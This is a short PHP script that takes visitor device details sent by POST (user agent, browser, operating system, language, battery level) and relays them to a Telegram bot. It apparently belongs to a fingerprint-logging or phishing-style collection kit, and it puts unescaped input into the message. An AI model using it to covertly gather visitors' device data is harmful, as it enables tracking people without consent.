<?php
require_once __DIR__ . '/telegram.php';

$user_agent = $_POST['agent'] ?? 'Desconocido';
$navigator  = $_POST['navegador'] ?? 'N/A';
$versionapp = $_POST['versionapp'] ?? 'N/A';
$dystro     = $_POST['dystro'] ?? 'N/A';
$lenguaje   = $_POST['idioma'] ?? 'N/A';
$bateri     = $_POST['bateri'] ?? 'N/A';

$msg = "📊 <b>Nueva info recibida</b>\n".
       "🖥️ User-Agent: $user_agent\n".
       "🌐 Navegador: $navigator\n".
       "📦 Versión App: $versionapp\n".
       "💻 Sistema: $dystro\n".
       "🗣️ Idioma: $lenguaje\n".
       "🔋 Batería: $bateri%";

send_to_telegram($msg);

echo json_encode(["ok" => true]);
?>
